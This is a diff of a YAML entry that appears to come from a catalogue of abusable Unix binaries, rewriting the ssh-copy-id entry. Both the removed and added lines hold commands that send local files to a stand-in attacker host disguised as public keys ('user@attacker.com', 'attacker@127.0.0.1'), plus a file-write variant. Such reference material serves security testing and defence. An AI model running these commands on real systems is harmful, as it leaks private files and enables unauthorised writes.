@@ -1,21 +1,19 @@
 ---
-comment: |-
-  ssh-copy-id installs public keys on a remote server for passwordless login. It can be abused to exfiltrate arbitrary local files by tricking it into treating them as public keys.
 functions:
   file-read:
   - code: |-
-      mv secret.txt secret.txt.pub
-      ssh-copy-id -f -i secret.txt.pub attacker@127.0.0.1
-    contexts:
-      unprivileged:
-        comment: |-
-          Reads the contents of a local file and sends them to a remote host under the guise of a public key.
-  inherit:
-  - code: |-
-      ssh-copy-id -i secret.txt.pub attacker@host
+      ssh-copy-id -f -i /path/to/input-file.pub user@attacker.com
     comment: |-
-      The `-i` flag allows specifying arbitrary files. Combined with `-f`, this can be abused for exfiltration.
+      The input file must have the `.pub` file extension. The file will be copied to `~/.ssh/authorized_keys`, otherwise the `-t /path/to/output-file` option can be used.
     contexts:
+      sudo:
       unprivileged:
-    from: ssh
+  file-write:
+  - code: |-
+      ssh-copy-id -f -i /path/to/input-file.pub -t /path/to/output-file user@host
+    comment: |-
+      The input file must have the `.pub` file extension.
+    contexts:
+      sudo:
+      unprivileged:
 ...
